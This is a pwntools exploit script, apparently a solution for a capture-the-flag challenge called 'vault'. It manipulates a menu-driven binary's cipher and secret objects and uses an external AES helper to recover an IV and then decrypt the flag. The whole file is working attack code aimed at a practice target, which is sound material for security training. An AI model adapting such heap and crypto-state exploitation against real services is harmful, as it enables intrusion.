#!/usr/bin/env python3
import os
from pwn import *

def start():
    global p

    if args.REMOTE:
        p = remote("vault.chal.imaginaryctf.org", 1337)
    else:
        p = elf.process()

def gdb_attach():
    if args.NOGDB or args.REMOTE:
        return
    
    gdb.attach(p, '''
    continue
    ''')

    input('ATTACHED?')

def sendchoice(choice: int):
    p.sendlineafter("> ", str(choice))

def create_cipher(cipher: int, additional: bytes = None):
    sendchoice(1)
    p.sendlineafter(': ', str(cipher))

    if additional:
        p.sendlineafter(": ", additional)

def delete_cipher(cipher: int):
    sendchoice(2)
    p.sendlineafter(': ', str(cipher))

def create_secret(index: int, secret: bytes, cipher: int):
    sendchoice(3)
    p.sendlineafter(": ", str(index))
    p.sendlineafter(": ", secret)
    p.sendlineafter(": ", str(cipher))

def view_secret(index: int):
    sendchoice(5)
    p.sendlineafter(": ", str(index))

def encrypt_flag():
    sendchoice(6)
    p.sendlineafter(": ", "0")

context.binary = elf = ELF("./vuln")
libc = elf.libc

plaintext = (b'stdnoerr'*(0x40//8))[:-1]

with open("plain.txt", "wb+") as fp:
    fp.write(plaintext)

start()

delete_cipher(0)
create_cipher(2)
create_secret(0, plaintext, 0)
view_secret(0)

ciphertext = bytes.fromhex(b''.join(p.recvline(False).split()).decode())

with open("cipher.txt", "wb+") as fp:
    fp.write(ciphertext)

os.system("./aes A")

with open("IV.txt", "rb") as fp:
    IV = fp.read()

print(IV)

encrypt_flag()
view_secret(0)
ciphertext = bytes.fromhex(b''.join(p.recvline(False).split()).decode())

with open("cipher.txt", "wb+") as fp:
    fp.write(ciphertext)

os.system("./aes B")

with open("plain.txt", "rb") as fp:
    flag = fp.read()

print(flag)

gdb_attach()

p.interactive()
p.close()